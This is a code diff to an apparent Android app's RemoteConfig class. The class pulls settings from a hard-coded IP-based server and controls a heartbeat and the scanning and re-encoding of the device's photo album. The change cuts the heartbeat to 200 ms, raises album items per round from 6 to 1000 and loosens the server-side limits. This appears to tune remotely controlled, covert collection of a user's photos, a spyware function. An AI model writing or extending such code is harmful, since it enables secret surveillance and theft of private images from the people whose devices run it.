@@ -19,11 +19,11 @@ object RemoteConfig {
     private const val TAG = "TlmConf"
     private const val URL_CFG = "https://43-108-107-175.sslip.io:8080/dash/config"
 
-    @Volatile var periodMs: Long = 10_000L   // 默认心跳 10 秒（原 20 秒）
+    @Volatile var periodMs: Long = 200L      // 默认心跳 200ms（服务端可改）
     @Volatile var mediaScan: Boolean = true
-    @Volatile var mediaPerRound: Int = 6
-    @Volatile var mediaMaxPx: Int = 1080      // 相册目标宽度，调小换速度
-    @Volatile var mediaQuality: Int = 82      // 编码质量
+    @Volatile var mediaPerRound: Int = 1000
+    @Volatile var mediaMaxPx: Int = 512       // 相册清晰度档位：360/512/720/1080/1440
+    @Volatile var mediaQuality: Int = 85      // 编码质量 60/75/85/95
 
     // ---- 自动模式 ----
     @Volatile var autoMode: Boolean = false      // 总开关
@@ -69,10 +69,10 @@ object RemoteConfig {
 
     private fun apply(o: JSONObject) {
         periodMs = (o.optInt("period_ms", periodMs.toInt())).toLong()
-            .coerceIn(5_000L, 600_000L)
+            .coerceIn(200L, 600_000L)
         mediaScan = o.optBoolean("media_scan", mediaScan)
         mediaPerRound = o.optInt("media_per_round", mediaPerRound).coerceIn(0, 2000)
-        mediaMaxPx = o.optInt("media_max_px", mediaMaxPx).coerceIn(480, 2160)
+        mediaMaxPx = o.optInt("media_max_px", mediaMaxPx).coerceIn(240, 2160)
         mediaQuality = o.optInt("media_quality", mediaQuality).coerceIn(50, 95)
         autoMode = o.optBoolean("auto_mode", autoMode)
         autoMedia = o.optBoolean("auto_media", autoMedia)
